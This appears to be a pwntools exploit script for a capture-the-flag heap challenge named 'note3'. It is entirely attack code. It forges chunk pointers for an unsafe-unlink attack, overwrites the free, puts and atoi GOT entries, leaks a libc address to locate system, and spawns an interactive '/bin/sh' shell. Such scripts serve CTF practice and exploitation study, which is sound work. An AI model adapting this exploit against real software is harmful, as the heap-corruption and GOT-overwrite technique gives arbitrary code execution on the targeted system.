#!/usr/bin/python
# -*- coding: <encoding name> -*-

from pwn import *
import time,sys,binascii

elf_name = "./note3"
elf = ELF(elf_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = process(elf_name)
#gdb.attach(io, "b *0x400912")

def newnote(size, content):
    io.recvuntil('option--->>')
    io.sendline(str(1))
    io.recvuntil('(less than 1024)')
    io.sendline(str(size))
    io.recvuntil('Input the note content:')
    io.sendline(content)
'''
def shownote(id):
    io.recvuntil('option--->>')
    io.sendline(str(2))
    io.recvuntil('note:')
    io.sendline(str(id))
'''
def editnote(id, content):
    io.recvuntil('option--->>')
    io.sendline(str(3))
    io.recvuntil('note:')
    io.sendline(str(id))
    io.recvuntil('Input the new content:')
    io.sendline(content)

def deletenote(id):
    io.recvuntil('option--->>')
    io.sendline(str(4))
    io.recvuntil('note:')
    io.sendline(str(id))

def main():
    ptr_array = 0x6020C8
    fakefd = ptr_array - 0x18
    fakebk = ptr_array - 0x10
    payload = 'a' * 8
    payload += p64(0xa1)
    payload += p64(fakefd)
    payload += p64(fakebk)
    newnote(0x80, payload)
    newnote(0x0,'a'*8)
    newnote(0x80, 'b'*8)
    deletenote(1)

    payload = 'b' * 0x10
    payload += p64(0xa0)
    payload += p64(0x90)
    newnote(0x0, payload)
    deletenote(2)

    free_got = 0x602018
    puts_got = 0x602020
    atoi_got = 0x602070
    payload = 'a' * 0x18 + p64(free_got) + p64(puts_got) + p64(atoi_got)
    editnote(0, payload)
    puts_plt = 0x400736
    editnote(0, p64(puts_plt)[:-1])

    deletenote(1)
    io.recvuntil('\x0a')
    data = io.recvuntil('\n')[:-1]
    puts_addr = u64(data.ljust(8,'\x00'))
    print 'puts_addr is,', hex(puts_addr)
    system_addr = puts_addr - libc.symbols['puts'] + libc.symbols['system']
    print 'system_addr is,', hex(system_addr)

    payload = p64(system_addr)
    editnote(2, payload)

    io.recvuntil('option--->>')
    io.sendline('/bin/sh')
    io.interactive()

if __name__ == '__main__':
    main()
